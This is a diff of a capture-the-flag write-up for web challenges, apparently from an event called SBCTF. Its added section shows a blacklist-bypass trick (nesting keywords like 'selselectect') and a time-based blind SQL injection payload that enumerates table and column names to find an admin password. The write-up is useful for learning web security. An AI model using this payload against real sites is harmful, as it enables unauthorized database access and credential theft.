@@ -8,12 +8,17 @@ It was awesome ctf ,so let's enjoy with writeup.
 
 if we go to robots.txt
 ![Screenshot at 2021-07-21 12-50-50](https://user-images.githubusercontent.com/52857059/126532244-bbbeab00-c481-4dd8-8796-bc2387fddf66.png)
+
 let's open it
+
 ![Screenshot at 2021-07-21 12-52-21](https://user-images.githubusercontent.com/52857059/126541361-fd18864b-3af2-4b03-b041-8b75630f46fc.png)
+
  hmmm let's try this cookie --> 
+ 
  ![Screenshot at 2021-07-21 12-53-05](https://user-images.githubusercontent.com/52857059/126541551-37d9a6b3-bb92-43de-8e75-52076fb659ab.png)
  
 change user-agent to CyberTalents
+
 ![Screenshot at 2021-07-21 12-53-36](https://user-images.githubusercontent.com/52857059/126541686-16595594-822a-4623-b551-36237c65888e.png)
 
 
@@ -248,3 +253,25 @@ last payload -->
 
 booom flag SBCTF{It_!s_th3_FL4GSH!P!}
 
+## 3- INCEPTION(easy)
+
+if we open 
+```html
+https://ch24.sbug.se/?src (getting ?src from page source)
+```
+
+![Screenshot at 2021-07-21 12-57-59](https://user-images.githubusercontent.com/52857059/126552622-c5f1a8db-a4ce-4e45-a9b5-3d0d2a742147.png)
+
+```html
+they are BlackList words replace them to space -->  preg_replace("/select|union|from|where/i", "", @$_GET["fname"]);
+```
+I thought it was sqli injection exactly blind sqli because when I injected input no error was appeared 
+
+I bypassed these words in blacklist by wrote the same word again in the middle EX: (select ---> selselectect) 
+
+I stared injecting with this payload , I guessed the part of column name 'pass' cause he said in description challenge (find the admin password) 
+
+```html
+1'+OR+(selselectect+sleep(10)+frofromm+dual+whewherere+(selselectect+table_name+frfromom information_schema.columns+whwhereere+table_schema=database()+and+column_name+like+'%pass%'+limit+0,1)+like+'%%')%23
+```
+By guessing &trying I got columns (passwd , uname , role), table (inception_users)
